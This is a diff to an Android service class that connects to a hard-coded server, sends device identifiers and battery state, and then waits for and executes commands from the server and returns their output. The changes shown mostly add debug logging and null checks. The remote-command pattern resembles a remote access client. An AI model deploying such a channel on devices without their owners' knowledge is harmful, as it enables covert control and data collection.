@@ -144,42 +144,71 @@ public class ConnectionManager extends Service {
         connectionThread.start();
     }
 
-    private void connectAndListen() {
+
+private void connectAndListen() {
+    try {
+        closeConnection();
+
+        Log.d(TAG, "Connecting to " + Constants.SERVER_IP + ":" + Constants.SERVER_PORT);
+
+        socket = new Socket();
+        socket.connect(new InetSocketAddress(Constants.SERVER_IP, Constants.SERVER_PORT),
+            Constants.CONNECTION_TIMEOUT);
+        socket.setSoTimeout(Constants.SOCKET_TIMEOUT);
+
+        out = new PrintWriter(new BufferedWriter(
+            new OutputStreamWriter(socket.getOutputStream())), true);
+        in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+
+        isConnected = true;
+        Log.d(TAG, "✅ Connected to server. Socket is connected: " + socket.isConnected());
+        Log.d(TAG, "✅ Output stream ready: " + (out != null));
+        Log.d(TAG, "✅ Input stream ready: " + (in != null));
+
+        // Send device info on connect with verification
+        Log.d(TAG, "📱 Attempting to send device info...");
         try {
-            closeConnection();
-
-            Log.d(TAG, "Connecting to " + Constants.SERVER_IP + ":" + Constants.SERVER_PORT);
-
-            socket = new Socket();
-            socket.connect(new InetSocketAddress(Constants.SERVER_IP, Constants.SERVER_PORT),
-                Constants.CONNECTION_TIMEOUT);
-            socket.setSoTimeout(Constants.SOCKET_TIMEOUT);
-
-            out = new PrintWriter(new BufferedWriter(
-                new OutputStreamWriter(socket.getOutputStream())), true);
-            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
-
-            isConnected = true;
-            Log.d(TAG, "Connected to server");
-
-            // Send device info on connect (NOW IN JSON FORMAT)
             sendDeviceInfo();
-
-            String command;
-            while (isRunning && isConnected && (command = in.readLine()) != null) {
-                Log.d(TAG, "Received command: " + command);
-                processCommand(command);
+            Log.d(TAG, "✅ sendDeviceInfo() completed without exceptions");
+            
+            // Flush to ensure it's sent
+            if (out != null) {
+                out.flush();
+                Log.d(TAG, "✅ Output stream flushed");
             }
-
-        } catch (SocketTimeoutException e) {
-            Log.e(TAG, "Socket timeout");
-        } catch (IOException e) {
-            Log.e(TAG, "IO Exception: " + e.getMessage());
-        } finally {
-            isConnected = false;
-            closeConnection();
+        } catch (Exception e) {
+            Log.e(TAG, "❌ EXCEPTION in sendDeviceInfo: " + e.getMessage());
+            e.printStackTrace();
         }
+
+        // Now wait for commands
+        Log.d(TAG, "Waiting for commands...");
+        String command;
+        while (isRunning && isConnected && (command = in.readLine()) != null) {
+            Log.d(TAG, "📨 Received command: " + command);
+            processCommand(command);
+        }
+
+    } catch (SocketTimeoutException e) {
+        Log.e(TAG, "❌ Socket timeout: " + e.getMessage());
+    } catch (IOException e) {
+        Log.e(TAG, "❌ IO Exception: " + e.getMessage());
+    } catch (Exception e) {
+        Log.e(TAG, "❌ Unexpected error: " + e.getMessage());
+        e.printStackTrace();
+    } finally {
+        Log.d(TAG, "Connection closed");
+        isConnected = false;
+        closeConnection();
     }
+}
+
+
+
+
+
+
+
 
     private void processCommand(String command) {
         if (command == null || command.isEmpty()) return;
@@ -361,49 +390,56 @@ public class ConnectionManager extends Service {
     }
     
     // NEW: Send device info as JSON
+
 private void sendDeviceInfo() {
+    Log.d(TAG, "📱 sendDeviceInfo() STARTED");
     try {
-        Log.d(TAG, "📱 Attempting to send device info...");
-        
         JSONObject info = new JSONObject();
         info.put("type", "device_info");
-        info.put("id", deviceId);
-        info.put("model", android.os.Build.MODEL);
-        info.put("manufacturer", android.os.Build.MANUFACTURER);
-        info.put("brand", android.os.Build.BRAND);
-        info.put("device", android.os.Build.DEVICE);
-        info.put("product", android.os.Build.PRODUCT);
-        info.put("android_version", android.os.Build.VERSION.RELEASE);
+        info.put("id", deviceId != null ? deviceId : "unknown");
+        info.put("model", android.os.Build.MODEL != null ? android.os.Build.MODEL : "unknown");
+        info.put("manufacturer", android.os.Build.MANUFACTURER != null ? android.os.Build.MANUFACTURER : "unknown");
+        info.put("brand", android.os.Build.BRAND != null ? android.os.Build.BRAND : "unknown");
+        info.put("device", android.os.Build.DEVICE != null ? android.os.Build.DEVICE : "unknown");
+        info.put("product", android.os.Build.PRODUCT != null ? android.os.Build.PRODUCT : "unknown");
+        info.put("android_version", android.os.Build.VERSION.RELEASE != null ? android.os.Build.VERSION.RELEASE : "unknown");
         info.put("sdk", android.os.Build.VERSION.SDK_INT);
         info.put("battery", getBatteryInfo());
         info.put("timestamp", System.currentTimeMillis());
         
         String jsonString = info.toString();
-        Log.d(TAG, "📦 JSON to send: " + jsonString);
+        Log.d(TAG, "📦 JSON created: " + jsonString);
         
-        if (out != null && isConnected) {
+        if (out != null) {
+            Log.d(TAG, "📤 Sending via out.println()...");
             out.println(jsonString);
             out.flush();
             Log.d(TAG, "✅ Device info sent successfully");
         } else {
-            Log.e(TAG, "❌ Cannot send: out=" + out + ", isConnected=" + isConnected);
+            Log.e(TAG, "❌ Cannot send: out is null");
         }
         
     } catch (JSONException e) {
-        Log.e(TAG, "❌ JSON Error: " + e.getMessage());
+        Log.e(TAG, "❌ JSONException: " + e.getMessage());
         e.printStackTrace();
         // Fallback to old format
         String info = "Device connected:\n" + getDeviceInfo();
-        if (out != null && isConnected) {
+        if (out != null) {
             out.println(info);
             out.flush();
+            Log.d(TAG, "✅ Fallback device info sent");
         }
     } catch (Exception e) {
-        Log.e(TAG, "❌ Unexpected error: " + e.getMessage());
+        Log.e(TAG, "❌ Unexpected exception in sendDeviceInfo: " + e.getMessage());
         e.printStackTrace();
     }
-}    
-    // NEW: Send JSON response for commands
+    Log.d(TAG, "📱 sendDeviceInfo() FINISHED");
+}
+   
+
+
+
+ // NEW: Send JSON response for commands
     private void sendJsonResponse(String type, String command, String output) {
         try {
             JSONObject response = new JSONObject();
